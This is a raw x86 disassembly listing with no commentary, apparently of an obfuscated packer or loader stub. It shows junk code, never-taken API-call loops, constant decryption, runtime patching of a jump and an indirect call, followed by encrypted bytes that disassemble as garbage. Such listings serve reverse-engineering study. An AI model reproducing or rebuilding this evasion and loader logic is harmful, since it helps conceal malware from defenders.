  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xb8159902
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x59]
  40bac3:	pusha  
  40bac4:	and    BYTE PTR [ebx+0x61],dl
  40bac7:	mov    ebx,0x2e47c14e
  40bacc:	push   0xaaed9265
  40bad1:	ja     0x40bafe
  40bad3:	out    dx,eax
  40bad4:	jbe    0x40bab7
  40bad6:	(bad)  
  40bad7:	out    0x51,al
  40bad9:	out    dx,eax
  40bada:	rcr    DWORD PTR [edi],cl
  40badc:	push   0xfffffff4
  40bade:	jae    0x40ba86
  40bae0:	mov    ebx,0x55da5fc9
  40bae5:	outs   dx,BYTE PTR ds:[esi]
  40bae6:	cmp    ebx,esp
  40bae8:	push   0xffffffdd
  40baea:	and    BYTE PTR [esi+0x755e8123],ah
  40baf0:	(bad)  
  40baf1:	lock pop eax
  40baf3:	mov    fs,WORD PTR [ebp+0x56]
  40baf6:	cmp    al,bl
  40baf8:	popa   
  40baf9:	add    dl,al
  40bafb:	addr16 pop esp
  40bafd:	cmp    DWORD PTR [ecx],esp
  40baff:	lock and edx,esp
  40bb02:	pop    ebx
  40bb03:	popw   es
  40bb05:	aam    0x2b
  40bb07:	jae    0x40bb61
  40bb09:	ja     0x40bad1
  40bb0b:	lods   eax,DWORD PTR ds:[esi]
  40bb0c:	mov    bl,0x5f
  40bb0e:	stc    
  40bb0f:	push   ds
  40bb10:	cmp    eax,0xe455d733
  40bb15:	mov    ebx,0x38ae5af7
  40bb1a:	jne    0x40bb5c
  40bb1c:	pop    edi
  40bb1d:	ret    0x8903
  40bb20:	stc    
  40bb21:	push   edx
  40bb22:	sub    al,0x44
  40bb24:	jo     0x40bb16
  40bb26:	cmp    bl,bl
  40bb28:	cmp    al,0xcc
  40bb2a:	int    0x5e
  40bb2c:	or     ah,BYTE PTR [eax-0x60]
  40bb2f:	adc    eax,DWORD PTR [ebp*2-0x1c8c6bbc]
  40bb36:	ins    DWORD PTR es:[edi],dx
  40bb37:	sub    esi,DWORD PTR [edi]
  40bb39:	sbb    al,0x40
  40bb3b:	jnp    0x40bae3
  40bb3d:	jae    0x40bb21
  40bb3f:	xchg   esp,eax
  40bb40:	mov    es:0xa13f05a0,al
  40bb46:	cmp    DWORD PTR [eax+0x5c5742c4],0xffffffd8
  40bb4d:	aam    0x9d
  40bb4f:	outs   dx,BYTE PTR ds:[esi]
  40bb50:	mov    dh,0x21
  40bb52:	xor    dh,BYTE PTR [edi-0x5686d567]
  40bb58:	sub    BYTE PTR [ebp+0x34],dh
  40bb5b:	pop    ecx
  40bb5c:	mov    ah,BYTE PTR [esp+eiz*8+0x3d86178f]
  40bb63:	cmc    
  40bb64:	jb     0x40bb1b
  40bb66:	pop    eax
  40bb67:	mov    ah,BYTE PTR [ecx-0x1]
  40bb6a:	sub    al,0x3e
  40bb6c:	sub    ecx,DWORD PTR [ebx-0x415aa664]
  40bb72:	nop
  40bb73:	ds jno 0x40bb2e
  40bb76:	mov    edi,0x3b86266c
  40bb7b:	dec    esi
  40bb7c:	xlat   BYTE PTR ds:[ebx]
  40bb7d:	es test eax,0x724c57e
  40bb83:	mov    ax,ds:0xb0bd6219
  40bb89:	(bad)  
  40bb8a:	dec    ecx
  40bb8b:	mov    ah,0xc5
  40bb8d:	aam    0xff
  40bb8f:	mov    BYTE PTR [ecx-0x23],dl
  40bb92:	mov    eax,0x4c4ee96a
  40bb97:	pop    esi
  40bb98:	sub    DWORD PTR [edi],0x16
  40bb9b:	sbb    BYTE PTR [ecx+ebp*8],cl
  40bb9e:	mov    esp,0xaa058a5c
  40bba3:	mov    eax,0x688cbbe4
  40bba8:	inc    esp
  40bba9:	inc    ebx
  40bbaa:	pop    ebp
  40bbab:	push   ebx
  40bbac:	pop    ebp
  40bbad:	jmp    0x40bbef
  40bbaf:	(bad)  
  40bbb1:	xchg   ecx,eax
  40bbb2:	sub    ebp,DWORD PTR [edi]
  40bbb4:	xor    al,0xf0
  40bbb6:	jno    0x40bb56
  40bbb8:	call   0xdb35:0xf9ee8629
  40bbbf:	mov    al,ds:0xd24b885b
  40bbc4:	sub    BYTE PTR [ebx-0x63dc5153],ch
  40bbca:	mov    gs,WORD PTR [eax+0x735557f7]
  40bbd0:	and    ebp,DWORD PTR [esi+0x78]
  40bbd3:	dec    ecx
  40bbd4:	loop   0x40bbdb
  40bbd6:	sbb    cl,dh
  40bbd8:	sbb    DWORD PTR [edx-0x26],0x2585b3fa
  40bbdf:	sub    edi,DWORD PTR [ecx]
  40bbe1:	leave  
  40bbe2:	ins    DWORD PTR es:[edi],dx
  40bbe3:	add    DWORD PTR [ebx+edx*8-0x1e379504],esi
  40bbea:	jns    0x40bb88
  40bbec:	xchg   ebp,eax
  40bbed:	aam    0x89
  40bbef:	outs   dx,BYTE PTR ds:[esi]
  40bbf0:	sbb    eax,0x661dda88
  40bbf5:	sti    
  40bbf6:	ins    BYTE PTR es:[edi],dx
  40bbf7:	mov    ch,BYTE PTR [ecx]
  40bbf9:	enter  0x164f,0x47
  40bbfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfe:	push   cs
  40bbff:	call   0x13e7dd51
  40bc04:	dec    ebx
  40bc05:	lds    edx,FWORD PTR [eax+0x2b]
  40bc08:	and    al,0xfe
  40bc0a:	mov    ds:0x513df9b3,eax
  40bc0f:	stos   DWORD PTR es:[edi],eax
  40bc10:	and    eax,DWORD PTR [ecx]
  40bc12:	ja     0x40bbf0
  40bc14:	cmc    
  40bc15:	push   edx
  40bc16:	or     eax,0xb665d0fe
  40bc1b:	push   ecx
  40bc1c:	cmp    ebp,DWORD PTR [eax]
  40bc1e:	adc    eax,0xc64a9b29
  40bc23:	lahf   
  40bc24:	xchg   ecx,eax
  40bc25:	imul   esi,DWORD PTR [edi],0x8af44f28
  40bc2b:	in     al,0xbb
  40bc2d:	dec    esi
  40bc2e:	cld    
  40bc2f:	adc    BYTE PTR [edx],bl
  40bc31:	xchg   BYTE PTR [ecx-0x72],al
  40bc34:	dec    ecx
  40bc36:	icebp  
  40bc37:	aaa    
  40bc38:	stos   BYTE PTR es:[edi],al
  40bc39:	add    ch,ch
  40bc3b:	fs push edi
  40bc3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc3e:	fdiv   QWORD PTR [eax+edx*8]
  40bc41:	pushw  0x9351
  40bc45:	and    ah,dl
  40bc47:	jb     0x40bbd9
  40bc49:	sub    DWORD PTR [edx-0x25],ebp
  40bc4c:	test   eax,0xee46355d
  40bc51:	mov    ah,0x9e
  40bc53:	or     BYTE PTR [edx],cl
  40bc55:	mov    ds:0x393806fa,al
  40bc5a:	aaa    
  40bc5b:	sti    
  40bc5c:	enter  0x1c3f,0x14
  40bc60:	scas   eax,DWORD PTR es:[edi]
  40bc61:	ja     0x40bc5f
  40bc63:	cli    
  40bc64:	jp     0x40bc2c
  40bc66:	xchg   esi,eax
  40bc67:	clc    
  40bc68:	push   ds
  40bc69:	lahf   
  40bc6a:	jmp    0xd9a9:0xd87eb0b5
  40bc71:	xor    edi,DWORD PTR [ecx]
  40bc73:	loopne 0x40bc1a
  40bc75:	(bad)  [ebx+0x13b495e]
  40bc7b:	sub    al,0xad
